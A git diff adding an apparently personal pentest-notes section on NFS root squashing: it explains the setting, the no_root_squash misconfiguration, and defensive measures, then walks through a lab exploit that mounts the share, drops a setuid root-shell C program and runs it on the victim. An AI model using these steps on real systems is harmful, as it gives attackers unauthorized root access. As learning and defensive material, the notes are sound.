@@ -787,3 +787,72 @@ okay we got root :)
 ### Conclusion
 
 Cron jobs are a critical tool for automating system tasks in Linux, but they must be managed with security in mind. Misconfigurations or weak permissions can turn cron jobs into a significant threat, potentially enabling attackers to escalate privileges and compromise the system. By understanding the risks and implementing best practices, you can leverage the power of cron jobs while keeping your system secure.
+
+# NFS Root Squashing
+
+### NFS Root Squashing: A Privilege Escalation Technique
+
+**NFS (Network File System)** is a distributed file system protocol that allows a user on a client machine to access files over a network in a manner similar to how local storage is accessed. However, NFS has a potential vulnerability related to its security feature called **Root Squashing**.
+
+**Root Squashing** is a security measure in NFS that maps the root user on the client machine to a less-privileged user (typically the user `nobody`) on the NFS server. This prevents the root user on a client machine from gaining root-level access to files on the NFS server, mitigating the risk of privilege escalation.
+
+### How Root Squashing Works
+
+When a user on a client machine accesses an NFS share as root, instead of being granted root privileges on the server, their user ID (UID) and group ID (GID) are typically mapped to those of a non-privileged user, usually `nobody` (UID 65534). This process is known as **root squashing**.
+
+### Privilege Escalation via Root Squashing Misconfiguration
+
+A common privilege escalation scenario arises when root squashing is misconfigured or not enabled on the NFS server. If the NFS share is mounted with **root squashing disabled**, the root user on the client machine can have root privileges on the NFS share, enabling them to:
+
+1. **Read/Write sensitive files**: The root user can access and modify any file within the NFS share, including configuration files, user data, and potentially even the system binaries.
+2. **Modify permissions**: The user can change file permissions, ownership, and potentially escalate their privileges by modifying executables or scripts that are run by other users or services on the server.
+
+### Exploiting NFS with Disabled Root Squashing
+
+If root squashing is disabled, a penetration tester or attacker could exploit this configuration as follows:
+
+1. **Mount the NFS Share**: The attacker mounts the NFS share on their local system.
+2. **Gain Root Access**: As the root user, they would have full control over the files in the NFS share, similar to being the root on the server itself.
+3. **Privilege Escalation**: The attacker can then perform actions such as placing a malicious script in a cron job directory, altering the content of user data, or even replacing system binaries to maintain persistence or escalate privileges further on the network.
+
+### Defensive Measures
+
+To prevent this type of attack, ensure that:
+
+1. **Root Squashing is Enabled**: By default, NFS should be configured with root squashing enabled to ensure that root users on client machines do not automatically receive root privileges on the server.
+2. **Use Strong Authentication**: Employ strong authentication mechanisms to control which clients can access the NFS share.
+3. **Minimize NFS Usage**: Where possible, limit the use of NFS and consider alternatives that provide more robust security controls.
+
+Root squashing is a simple yet crucial aspect of NFS security. Misconfigurations can lead to severe security breaches, making it imperative to ensure that NFS servers are correctly configured to squash root privileges by default.
+
+### Example :-
+
+First we run this command **`cat /etc/exports`  and see results** 
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-16 063201.png)
+
+we found `no_root_squash` option is defined for the write `showmount -e <ip>`
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-16 064052.png)
+
+okay let do this steps `**mkdir /tmp/1` and `mount -o rw,vers=2 <ip>:/tmp /tmp/1`** 
+
+and **`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`**
+
+and use gcc to make it exeute **gcc `/tmp/1/x.c -o /tmp/1/x` and change permations**
+
+**`chmod +s /tmp/1/x`** 
+
+and in victm do this :
+
+**`/tmp/x`**
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-16 065705.png)
+
+this is attacker VM
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-16 065806.png)
+
+victm VM 
+
+we got roooot  :)
